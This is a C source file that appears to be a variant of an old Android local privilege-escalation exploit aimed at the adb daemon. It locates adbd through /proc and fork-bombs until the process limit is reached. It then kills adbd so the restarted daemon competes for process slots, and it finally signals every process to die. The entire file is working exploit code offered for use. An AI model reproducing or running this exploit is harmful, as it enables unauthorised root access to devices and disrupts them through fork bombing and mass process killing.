/*
 *   Copyright 2011, Kyan He <kyan.ql.he@gmail.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *   Modified: 
 *      Kyan He <kyan.ql.he@gmail.com> @ Mon Feb 28 17:44:33 CST 2011
 *
 *   Inspired by c-skill team
 */

#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/socket.h>

void die(const char *msg)
{
   perror(msg);
   exit(errno);
}

static void I(const char *msg, ...)
{
    va_list ap;
    FILE *f;

    va_start(ap, msg);
    vfprintf(stderr, msg, ap);
    f = fopen("/data/local/rlimit.log", "a");
    if (f) {
        vfprintf(f, msg, ap);
        fclose(f);
    }
    va_end(ap);

}

static void W(const char *msg, va_list ap)
{
    FILE *f;

    f = fopen("/data/local/rlimit.log", "a");
    if (!f)
        return;

    vfprintf(f, msg, ap);
    fclose(f);
}

pid_t get_pid_of_adb()
{
    char x[256];
    int i = 0, fd = 0;
    pid_t found = 0;

    for (i = 0; i < 32000; ++i) {
        sprintf(x, "/proc/%d/cmdline", i);

        fd = open(x, O_RDONLY);
        if (fd < 0)
            continue;

        memset(x, 0, sizeof(x));
        read(fd, x, sizeof(x));
        close(fd);

        if (strstr(x, "/sbin/adb")) {
            found = i;
            break;
        }
    }
    return found;
}

static void fork_logcat()
{
    int f;

    f = open("/data/local/logcat", O_WRONLY | O_CREAT);
    if (f < 0) {
        I("open logcat fail");
        return;
    }

    fcntl(f, F_SETFD, 0);

    if (fork() == 0) {
        dup2(f, 1);
        dup2(f, 2);

        execl("/system/bin/logcat", "logcat");
    }
}

int main(int argc, char **argv)
{
    struct rlimit rl;
    char x;
    pid_t p, pid;
    int n = 0;
    int s[2];

    fork_logcat();

    if (getrlimit(RLIMIT_NPROC, &rl) < 0)
        die("RLIMIT_NRPOC");

    if (rl.rlim_cur == RLIM_INFINITY)
        die("Oh no, you should crash your device");

    I("rlimit %ld, %ld\n", rl.rlim_cur, rl.rlim_max);
    pid = get_pid_of_adb();
    /* TODO: start adbd */
    if (pid < 0)
        die("no adb");

    setsid();

    /* create a mechansim for communicating */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, s) < 0)
        die("socketpair");

    /* make sure FD_CLOEXEC is not set */
    fcntl(s[0], F_SETFD, 0);
    fcntl(s[1], F_SETFD, 0);

    if (!fork()) {
        int p1 = 1; /* phase 1 */
        int p2 = 0; /* phase 2 */
        int p3 = 0; /* phase 3 */

        I("Zygote machine start\n");

        /* dedicated process for zygoting babys */
        for (;;) {
            p = fork();
            if (p < 0) {

                if (p1) {
                    /* notify main process to kill adbd */
                    I("We spawn %d childs, %s\n", n, strerror(errno));
                    write(s[0], &x, 1);

                    p1 = 0;
                    p2 = 1;
                }

                if (p2) {
                    /* Competing with init, then enter phase 3 */
                }

                if (p3) {
                    //I("Phase 3\n");
                }

            } else if (p == 0) {
                exit(0);
            } else {
                n++;
                if (p2) {
                    write(s[0], &x, 1);
                    p2 = 0;
                    p3 = 1;
                }
            }
        }
        sync();
    }

    I("Enter phase 1\n");
    /* wait for phase 1 finish */
    read(s[1], &x, 1);

    I("Now killing adbd %d\n", pid);
    kill(pid, SIGKILL);

    /* enter phase 2 */
    I("Enter phase 2\n");
    I("Now competing with system\n");

    /* wait phase 2 finish */
    read(s[1], &x, 1);
    I("Enter phase 3\n");

    int tries = 0;
    while ((pid = get_pid_of_adb()) < 0 && tries++ < 30)
        sleep(1);

    waitpid(-1, &x, 0);

    kill(-1, 9);
    I("Now Over\n");
}
